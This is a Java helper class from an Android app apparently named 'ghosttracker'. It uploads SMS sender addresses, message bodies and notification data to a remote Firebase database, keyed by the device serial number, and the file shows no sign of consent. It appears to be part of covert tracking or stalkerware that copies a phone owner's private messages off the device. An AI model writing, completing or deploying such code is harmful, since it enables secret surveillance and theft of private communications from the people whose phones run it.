package com.maleezha.ghosttracker.utils;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Map;

public class FirebaseHelper {

    static String userId = android.os.Build.SERIAL; // Unique ID

    public static void pushSms(String address, String body) {
        DatabaseReference ref = FirebaseDatabase.getInstance().getReference("messages").child(userId).child("sms").push();
        ref.child("address").setValue(address);
        ref.child("body").setValue(body);
    }

    public static void pushNotification(Map<String, String> data) {
        DatabaseReference ref = FirebaseDatabase.getInstance().getReference("notifications");
        ref.push().setValue(data);
   }
}